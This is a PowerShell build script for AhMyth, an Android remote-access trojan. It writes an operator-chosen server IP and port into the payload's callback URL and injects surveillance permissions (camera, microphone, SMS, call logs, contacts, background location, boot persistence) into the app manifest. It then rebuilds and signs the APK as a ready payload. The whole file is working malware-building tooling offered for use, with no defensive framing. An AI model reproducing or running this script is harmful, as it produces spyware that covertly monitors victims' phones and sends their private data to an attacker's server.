# AhMyth payload builder - configurable IP/port + permission injection (JDK 11)
# Usage: powershell -File build-payload-gui.ps1 [-IP x.x.x.x] [-Port 16001] [-Camera 1|0] ...
#        reads config.txt for defaults; IP blank => prompts.
param(
    [string]$IP, [string]$Port,
    [string]$Camera, [string]$Storage, [string]$Mic, [string]$Location,
    [string]$Contacts, [string]$Sms, [string]$CallsLogs
)

$ErrorActionPreference = 'Stop'
$jdk = 'C:\Users\MECHREVO\jdk11\jdk-11.0.32.1+1'
$env:JAVA_HOME = $jdk
$env:PATH = "$jdk\bin;$env:PATH"

$root = Split-Path -Parent $MyInvocation.MyCommand.Path
$factory = Join-Path $root 'AhMyth-Server\app\app\Factory'
$src     = Join-Path $factory 'Ahmyth'
$manifest= Join-Path $src 'AndroidManifest.xml'
$smali   = Join-Path $src 'smali\ahmyth\mine\king\ahmyth\e.smali'
$buildSrc= 'C:\Users\MECHREVO\AhMyth\buildSrc'
$outApk  = 'C:\Users\MECHREVO\AhMyth\Output\Ahmyth-aligned-debugSigned.apk'

# ---- defaults from config.txt ----
$cfg = @{}
$cfgFile = Join-Path $root 'config.txt'
if (Test-Path $cfgFile) {
    Get-Content $cfgFile | Where-Object { $_ -match '^\s*[A-Za-z]+\s*=' } | ForEach-Object {
        $k,$v = ($_ -split '=',2) | ForEach-Object { $_.Trim() }
        $cfg[$k] = $v
    }
}

if (-not $IP)   { $IP   = if($cfg['IP'])  { $cfg['IP']  } else { '' } }
if (-not $Port) { $Port = if($cfg['PORT']){ $cfg['PORT']} else { '42474' } }
foreach ($n in 'Camera','Storage','Mic','Location','Contacts','Sms','CallsLogs') {
    if (-not (Get-Variable -Name $n -ErrorAction SilentlyContinue).Value) {
        $v = if($cfg[$n]) { $cfg[$n] } else { '1' }
        Set-Variable -Name $n -Value $v
    }
}
if (-not $IP) { $IP = Read-Host 'Enter Server IP (e.g. 192.168.1.10)' }

# ---- permission map (same as Constants.js checkboxMap) ----
$map = @{
 Camera   = @('android.permission.CAMERA','android.hardware.camera','android.hardware.camera.autofocus','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
 Storage  = @('android.permission.READ_EXTERNAL_STORAGE','android.permission.WRITE_EXTERNAL_STORAGE','android.permission.MANAGE_EXTERNAL_STORAGE','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
 Mic      = @('android.permission.RECORD_AUDIO','android.permission.MODIFY_AUDIO_SETTINGS','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
 Location = @('android.permission.ACCESS_FINE_LOCATION','android.permission.ACCESS_COARSE_LOCATION','android.permission.ACCESS_BACKGROUND_LOCATION','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
 Contacts = @('android.permission.READ_CONTACTS','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
 Sms      = @('android.permission.READ_SMS','android.permission.SEND_SMS','android.permission.RECEIVE_SMS','android.permission.WRITE_SMS','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
 CallsLogs= @('android.permission.READ_PHONE_STATE','android.permission.READ_CALL_LOG','android.permission.PROCESS_OUTGOING_CALLS','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
}
$ALL = @('android.permission.WAKE_LOCK','android.permission.CAMERA','android.permission.READ_EXTERNAL_STORAGE','android.permission.WRITE_EXTERNAL_STORAGE','android.permission.MANAGE_EXTERNAL_STORAGE','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.READ_SMS','android.permission.SEND_SMS','android.permission.RECEIVE_SMS','android.permission.WRITE_SMS','android.hardware.camera','android.hardware.camera.autofocus','android.permission.RECEIVE_BOOT_COMPLETED','android.permission.READ_PHONE_STATE','android.permission.READ_CALL_LOG','android.permission.PROCESS_OUTGOING_CALLS','android.permission.READ_CONTACTS','android.permission.RECORD_AUDIO','android.permission.MODIFY_AUDIO_SETTINGS','android.permission.ACCESS_FINE_LOCATION','android.permission.ACCESS_COARSE_LOCATION','android.permission.ACCESS_BACKGROUND_LOCATION','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS')

$names = 'Camera','Storage','Mic','Location','Contacts','Sms','CallsLogs'
$checked = @{}
foreach ($n in $names) { $checked[$n] = ((Get-Variable -Name $n).Value -eq '1') }
$onCount = ($names | Where-Object { $checked[$_] }).Count
if ($onCount -eq 0 -or $onCount -eq 7) { $selected = $ALL }
else { $selected = @($names | Where-Object { $checked[$_] } | ForEach-Object { $map[$_] } | Select-Object -Unique) }

Write-Host ('[cfg] IP={0} PORT={1}' -f $IP,$Port)
Write-Host ('[cfg] perms: ' + (($names | ForEach-Object { '{0}={1}' -f $_, $(if($checked[$_]){'ON'}else{'OFF'}) }) -join ' '))

# ---- inject IP into e.smali (UTF-8 no BOM) ----
$t = [IO.File]::ReadAllText($smali)
$t = [regex]::Replace($t, 'http://[0-9.]+:[0-9]+', ('http://{0}:{1}' -f $IP,$Port))
[IO.File]::WriteAllText($smali, $t, [System.Text.UTF8Encoding]::new($false))
Write-Host ('[*] Injected config: http://{0}:{1}' -f $IP,$Port)

# ---- inject permissions into AndroidManifest.xml ----
$permLines = foreach ($p in $selected) {
    if ($p -eq 'android.hardware.camera' -or $p -eq 'android.hardware.camera.autofocus') {
        '<uses-feature android:name="{0}"/>' -f $p
    } else {
        '<uses-permission android:name="{0}"/>' -f $p
    }
}
$block = ($permLines -join "`n") + "`n"
$xml = [IO.File]::ReadAllText($manifest)
$xml = [regex]::Replace($xml, '(?m)^\s*<uses-(permission|feature)[^>]*/>\r?\n', '')
$xml = [regex]::Replace($xml, '<application', $block + '<application', 1)
[IO.File]::WriteAllText($manifest, $xml, [System.Text.UTF8Encoding]::new($false))
Write-Host ('[*] Injected {0} permissions into manifest' -f $selected.Count)

# ---- copy to ASCII build dir ----
if (Test-Path $buildSrc) { Remove-Item -LiteralPath $buildSrc -Recurse -Force -ErrorAction SilentlyContinue }
Copy-Item -LiteralPath $src -Destination $buildSrc -Recurse -Force
if (Test-Path (Join-Path $buildSrc 'build')) { Remove-Item -LiteralPath (Join-Path $buildSrc 'build') -Recurse -Force -ErrorAction SilentlyContinue }

Write-Host '[*] Building payload (apktool)...'
Push-Location $factory
& java -jar apktool.jar b $buildSrc -o (Join-Path $buildSrc 'Ahmyth.apk')
$ok = ($LASTEXITCODE -eq 0)
Pop-Location
if (-not $ok) { Write-Host '[x] BUILD FAILED'; exit 1 }

Write-Host '[*] Signing...'
Push-Location $factory
& java -jar sign.jar -a (Join-Path $buildSrc 'Ahmyth.apk')
$ok = ($LASTEXITCODE -eq 0)
Pop-Location
if (-not $ok) { Write-Host '[x] SIGN FAILED'; exit 1 }

New-Item -ItemType Directory -Force -Path (Split-Path $outApk) | Out-Null
Copy-Item -Path (Join-Path $buildSrc 'Ahmyth-aligned-debugSigned.apk') -Destination $outApk -Force
Write-Host ''
Write-Host '[OK] Payload built & signed:' -ForegroundColor Green
Write-Host ('     {0}' -f $outApk)